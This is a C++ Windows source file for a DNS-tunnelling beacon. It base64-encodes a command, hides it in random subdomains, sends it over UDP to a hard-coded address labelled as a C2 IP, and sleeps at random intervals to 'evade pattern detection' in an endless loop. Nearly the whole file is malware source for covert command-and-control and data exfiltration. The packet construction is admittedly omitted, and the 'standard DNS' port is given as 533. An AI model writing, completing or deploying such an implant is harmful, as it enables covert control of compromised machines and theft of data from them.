#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <vector>
#include <string>
#include <cstring>
#include <random>
#include <chrono>
#include <thread>

#pragma comment(lib, "ws2_32.lib")

// --- Manual Base64 Encoding ---
const std::string BASE64_CHARS =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(const std::string& input) {
    std::string encoded;
    int i = 0, j = 0;
    unsigned char char_array_3[3], char_array_4[4];

    for (auto& c : input) {
        char_array_3[i++] = c;
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++)
                encoded += BASE64_CHARS[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++)
            encoded += BASE64_CHARS[char_array_4[j]];

        while (i++ < 3)
            encoded += '=';
    }

    return encoded;
}

// --- Random Domain Generation ---
std::string generate_random_string(int length) {
    const std::string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, chars.size() - 1);

    std::string random_str;
    for (int i = 0; i < length; ++i)
        random_str += chars[dist(gen)];
    return random_str;
}

// --- Time-Based Jitter (Random Delay) ---
void random_sleep() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(30, 3600); // 30s to 1h
    int delay = dist(gen);
    std::this_thread::sleep_for(std::chrono::seconds(delay));
}

// --- DNS Query Function ---
void send_dns_query(const std::string& domain) {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server_addr;

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return;
    }

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Socket creation failed\n";
        WSACleanup();
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(533); // Standard DNS
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.144"); // Replace with C2 IP

    // Simulate DNS query (full packet construction omitted for brevity)
    if (sendto(sock, domain.c_str(), domain.size(), 0,
        (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        std::cerr << "Send failed\n";
    }
    else {
        std::cout << "[+] Beacon sent: " << domain << std::endl;
    }

    closesocket(sock);
    WSACleanup();
}

int main() {
    while (true) {
        std::string command = "whoami"; // Replace with actual command
        std::string encoded_cmd = base64_encode(command);
        std::string domain = encoded_cmd + "." +
            generate_random_string(6) + "." +
            generate_random_string(8) + ".com";

        send_dns_query(domain);
        random_sleep(); // Evade pattern detection
    }
    return 0;
}